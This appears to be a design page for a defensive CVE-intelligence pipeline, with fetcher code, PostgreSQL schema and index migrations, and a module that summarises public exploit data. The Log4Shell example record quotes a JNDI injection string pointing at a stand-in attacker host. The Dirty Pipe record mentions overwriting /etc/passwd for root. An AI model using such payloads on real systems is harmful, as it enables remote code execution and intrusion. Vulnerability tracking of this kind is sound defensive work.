Ingestion Pipeline
Fetch → Normalize → Correlate → Store → Serve  ·  All 6 sources unified into a single schema
📡
FETCH
HTTP clients pull raw data from 6 external APIs. Retry logic, rate-limit backoff, cache headers respected.
🔄
NORMALIZE
Per-source parsers map fields to unified schema. Dates → UTC ISO8601, scores → float, versions → semver arrays.
🔗
CORRELATE
Deduplicate by CVE-ID. Merge CVSS from NVD, KEV flag from CISA, exploit links from ExploitDB + GitHub.
🗄️
STORE
Upsert into PostgreSQL. JSONB for flexible fields. Materialized views for dashboards. Full audit trail.
🚀
SERVE
REST API (FastAPI) + GraphQL endpoint. Paginated search, filter by severity/KEV/vendor. Webhook push for new criticals.

# ingestion/fetchers.py import asyncio, httpx, logging from tenacity import retry, wait_exponential, stop_after_attempt class CVEFetcher: def __init__(self): self.client = httpx.AsyncClient(timeout=30, follow_redirects=True) @retry(wait=wait_exponential(min=1, max=60), stop=stop_after_attempt(5)) async def fetch_nvd(self, cve_id: str) -> dict: url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}" r = await self.client.get(url, headers={"apiKey": NVD_API_KEY}) r.raise_for_status() return r.json() async def fetch_cisa_kev_bulk(self) -> list: # Single download — ~1MB JSON, cache locally for 6h url = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" r = await self.client.get(url) return r.json()["vulnerabilities"] async def fetch_github_pocs(self, cve_id: str) -> list: url = f"https://api.github.com/search/repositories?q={cve_id}&sort=stars" r = await self.client.get(url, headers={"Authorization": f"token {GITHUB_TOKEN}"}) return r.json().get("items", []) async def fetch_all(self, cve_id: str) -> dict: # Fan-out concurrent requests for a single CVE nvd, mitre, osv, gh = await asyncio.gather( self.fetch_nvd(cve_id), self.fetch_mitre(cve_id), self.fetch_osv(cve_id), self.fetch_github_pocs(cve_id), return_exceptions=True ) return {"nvd": nvd, "mitre": mitre, "osv": osv, "github": gh}

PostgreSQL Schema Design
Normalized relational core with JSONB escape hatches for source-specific fields. 8 tables, designed for fast CVE lookup and faceted filtering.
Why PostgreSQL over Elasticsearch? PostgreSQL with the pg_trgm extension provides full-text search, JSONB operators for flexible nested data, strong ACID guarantees for audit logs, and native array/range types for version comparisons — all without managing a separate search cluster. For datasets under ~50M CVE records, Postgres BRIN + GIN indexes outperform ES operationally.

SQLmigrations/001_create_core_tables.sql
CREATE EXTENSION IF NOT EXISTS "pgcrypto"; CREATE EXTENSION IF NOT EXISTS "pg_trgm"; -- trigram FTS CREATE TABLE cves ( id uuid PRIMARY KEY DEFAULT gen_random_uuid(), cve_id text UNIQUE NOT NULL, state text CHECK (state IN ('PUBLISHED','RESERVED','REJECTED')), description text, description_tsv tsvector GENERATED ALWAYS AS (to_tsvector('english', coalesce(description,''))) STORED, cvss_score numeric(4,1) CHECK (cvss_score BETWEEN 0 AND 10), severity text GENERATED ALWAYS AS ( CASE WHEN cvss_score >= 9.0 THEN 'CRITICAL' WHEN cvss_score >= 7.0 THEN 'HIGH' WHEN cvss_score >= 4.0 THEN 'MEDIUM' WHEN cvss_score > 0.0 THEN 'LOW' ELSE 'NONE' END ) STORED, cvss_vector text, cvss_version text, cwe_ids text[] DEFAULT '{}', assigner text, published_at timestamptz, modified_at timestamptz, patch_available boolean DEFAULT false, kev_status boolean DEFAULT false, sources text[] DEFAULT '{}', raw_data jsonb DEFAULT '{}', ingested_at timestamptz DEFAULT now(), updated_at timestamptz DEFAULT now() ); -- Auto-update updated_at trigger CREATE OR REPLACE FUNCTION touch_updated_at() RETURNS trigger AS $$ BEGIN NEW.updated_at = now(); RETURN NEW; END; $$ LANGUAGE plpgsql; CREATE TRIGGER trg_cves_updated_at BEFORE UPDATE ON cves FOR EACH ROW EXECUTE FUNCTION touch_updated_at();

Index Strategy
Targeted indexes for each query pattern — no over-indexing. Measured on ~250K CVE dataset.
Index design follows query pattern first: identify the 10 most common query shapes, then build exactly the indexes needed. Unnecessary indexes hurt write throughput on delta ingestion runs.
SQLmigrations/002_indexes.sql
-- ─── PRIMARY LOOKUP ─────────────────────────────────────── -- Single-CVE fetch: WHERE cve_id = 'CVE-2021-44228' CREATE UNIQUE INDEX idx_cves_cve_id ON cves (cve_id); -- ─── SEVERITY + SCORE FILTERING ─────────────────────────── -- Dashboard: WHERE severity = 'CRITICAL' ORDER BY cvss_score DESC CREATE INDEX idx_cves_severity_score ON cves (severity, cvss_score DESC); -- ─── TIME-RANGE QUERIES ──────────────────────────────────── -- Delta sync: WHERE modified_at > $last_run -- Recent CVEs: WHERE published_at > NOW() - INTERVAL '30 days' CREATE INDEX idx_cves_modified_at ON cves (modified_at DESC); CREATE INDEX idx_cves_published_at ON cves (published_at DESC); -- ─── KEV FILTER ─────────────────────────────────────────── -- Partial index: only indexes rows where kev_status IS TRUE -- ~1000 rows vs ~250K — massive size reduction CREATE INDEX idx_cves_kev ON cves (published_at DESC) WHERE kev_status = true; -- ─── CWE ARRAY SEARCH ───────────────────────────────────── -- WHERE cwe_ids @> ARRAY['CWE-79'] (GIN for array containment) CREATE INDEX idx_cves_cwes ON cves USING GIN (cwe_ids); -- ─── FULL-TEXT SEARCH ───────────────────────────────────── -- WHERE description_tsv @@ to_tsquery('log4j & remote') CREATE INDEX idx_cves_fts ON cves USING GIN (description_tsv); -- Trigram index for ILIKE '%log4j%' queries CREATE INDEX idx_cves_desc_trgm ON cves USING GIN (description gin_trgm_ops); -- ─── VENDOR / PRODUCT SEARCH ────────────────────────────── CREATE INDEX idx_ap_vendor ON affected_products (lower(vendor)); CREATE INDEX idx_ap_product ON affected_products (lower(product)); CREATE INDEX idx_ap_cve_id ON affected_products (cve_id); CREATE INDEX idx_ap_ecosystem ON affected_products (ecosystem) WHERE ecosystem IS NOT NULL; -- ─── EXPLOIT LOOKUPS ────────────────────────────────────── CREATE INDEX idx_exploits_cve_id ON exploits (cve_id); CREATE INDEX idx_exploits_type ON exploits (exploit_type); CREATE INDEX idx_exploits_published ON exploits (published_at DESC); -- Partial: only verified exploits for faster dashboard queries CREATE INDEX idx_exploits_verified ON exploits (cve_id) WHERE verified = true; -- ─── JSONB INDEXES ──────────────────────────────────────── -- Query into raw_data: raw_data @> '{"nvd": {"state": "ANALYZED"}}' CREATE INDEX idx_cves_raw_data ON cves USING GIN (raw_data jsonb_path_ops); -- ─── MATERIALIZED VIEW: dashboard stats ─────────────────── CREATE MATERIALIZED VIEW mv_severity_stats AS SELECT severity, COUNT(*) AS total, SUM(CASE WHEN kev_status THEN 1 ELSE 0 END) AS kev_count, SUM(CASE WHEN patch_available THEN 1 ELSE 0 END) AS patched_count FROM cves GROUP BY severity WITH NO DATA; -- Refresh daily: SELECT cron.schedule('refresh-stats','0 6 * * *','REFRESH MATERIALIZED VIEW CONCURRENTLY mv_severity_stats');

Exploit Intelligence Module
Detection, classification, and safe summarization of public exploit data
🔍
Exploit Detection
Cross-reference ExploitDB CSV by CVE-ID, search GitHub repos with CVE in name/description, check CISA KEV for in-wild confirmation. Score exploit confidence 0–100 based on source count × verification status.
🏷️
Type Classification
ExploitDB "type" field maps directly to: RCE, LPE (Privilege Escalation), DoS, SQLi, XSS, SSRF, Auth_Bypass, InfoDisc. GitHub repos classified by description keyword matching + LLM fallback.
📊
Difficulty Estimation
Combines CVSS Attack Complexity (AC), Privileges Required (PR), and User Interaction (UI) vectors with exploit type. RCE + AC:L + PR:N = "low" difficulty. Auth required + complex chain = "high".
📝
Safe Summarization
AI-generated technical description of the vulnerability mechanism: what component is affected, what the bug class is, what the attacker achieves. Never reproduces exploit code or attack payloads.

Never reproduces exploit code, attack payloads, or weaponized PoC. Uses Claude API to summarize from public description only. """ prompt = ( f"CVE: {cve_id}\nType: {exploit_type.value}\nDescription: {description}\n\n" "Write a 2-3 sentence technical summary explaining: " "(1) what component has the bug, (2) the bug class, " "(3) what an attacker achieves. " "Do NOT include exploit code, payloads, or step-by-step attack instructions." ) # ... call LLM API with above prompt ... return summarized_text
Example Enriched Exploit Records
💥 Log4Shell PoC — Remote Code Execution via JNDI Lookup CRITICAL RCE difficulty: LOW
📦 Source: exploit-db (EDB-50592) ⭐ GitHub: 4,200+ stars ✅ Verified: yes 🌐 Platform: java / webapps 🚨 KEV: confirmed in-wild
The Apache Log4j2 library's message lookup substitution feature fails to sanitize user-controlled input before passing it to a JNDI (Java Naming and Directory Interface) resolver. An attacker who can influence any logged string can inject a crafted ${jndi:ldap://attacker.com/a} lookup that causes the vulnerable server to make an outbound LDAP request and deserialize an attacker-supplied Java object — achieving unauthenticated remote code execution with the privileges of the application process. No authentication or user interaction is required, and the vulnerability affects any application using Log4j2 ≥2.0-beta9 <2.15.0.
⚡ Dirty Pipe — Linux Kernel Local Privilege Escalation HIGH LPE difficulty: MEDIUM
📦 Source: exploit-db (EDB-50808) ⭐ GitHub: 1,850+ stars ✅ Verified: yes 🐧 Platform: Linux kernel 5.8–5.16.11 🚨 KEV: confirmed in-wild
A flaw in the Linux kernel's pipe buffer management (introduced in v5.8) allows a local user to overwrite data in arbitrary read-only files, including SUID binaries. The bug stems from a missing flag initialization when merging pipe pages, enabling splice() calls to mark read-only page cache entries as writable. A local attacker can overwrite /etc/passwd or replace SUID executables to escalate to root without any special privileges beyond a local user account.
